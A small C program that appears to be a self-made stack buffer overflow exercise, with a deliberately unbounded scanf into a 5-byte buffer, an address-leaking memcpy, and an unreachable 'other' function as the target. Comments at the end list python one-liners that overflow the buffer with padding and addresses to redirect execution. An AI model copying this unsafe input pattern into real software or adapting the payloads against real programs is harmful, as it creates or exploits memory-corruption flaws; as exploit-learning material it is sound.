#include <stdio.h>
#include <string.h>

void other() {
    printf("U broken program!!! Congratulations\n");
}

void input() {
	int a;
    char buffer[5];
    memcpy(&a, buffer + 17, 4);
    printf("%x\n", a);
    scanf("%s", buffer);
    memcpy(&a, buffer + 17, 4);
    printf("%x\n", a);
    puts(buffer);
}

int main() {
    
    input();
    printf("Normal output\n");

    return 0;
}
//python -c "print('AAAAAAAAAAAAA\x50\x15\x40\x00')" | main.exe
//python3 -c "print('AAAAAAAAAAAAA\x04\x12\x00\x80')" | ./main.out
//python3 -c "print('AAaAaaaaaaaa\x69\x11\x00\x08')" | ./main.out
//python3 -c "print('AAA')" | ./main.out
//python3 -c "print('AAaAaaaaaaaaaaaa\xa9\x11\x00\x08')" | ./main.out